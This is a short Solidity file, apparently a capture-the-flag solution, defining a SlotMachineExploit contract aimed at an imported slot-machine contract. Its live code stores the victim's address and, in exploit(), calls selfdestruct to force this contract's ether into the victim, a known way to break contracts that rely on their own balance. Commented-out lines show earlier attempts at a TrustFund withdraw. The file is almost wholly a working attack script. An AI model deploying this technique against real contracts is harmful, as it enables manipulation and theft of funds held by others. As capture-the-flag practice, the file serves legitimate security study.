pragma solidity 0.4.24;

//import "./CtfFramework.sol";
//import "./SafeMath.sol";
import "./slotmachine.sol";

contract SlotMachineExploit{
    address public owner;
    address public victim_addr;
    //uint256 public winner;
    //bool public withdrewThisYear;
    //uint256 public numberOfWithdrawls = 0;
    
    constructor(address addr) payable public{
        // Remember our wallet address
        owner = msg.sender;
        // Remember the victim contract
        victim_addr = addr;
        //winner = 5 ether;
    }
    
    function () payable{
    }
    
    function exploit() external{
        //victim_addr.call(bytes4(keccak256("withdraw()")));
        //TrustFund(victim_addr).withdraw;
        //if (address(this).balance >= winner){
            //msg.sender.transfer(address(this).balance);
        selfdestruct(victim_addr);
        //}
    }
}
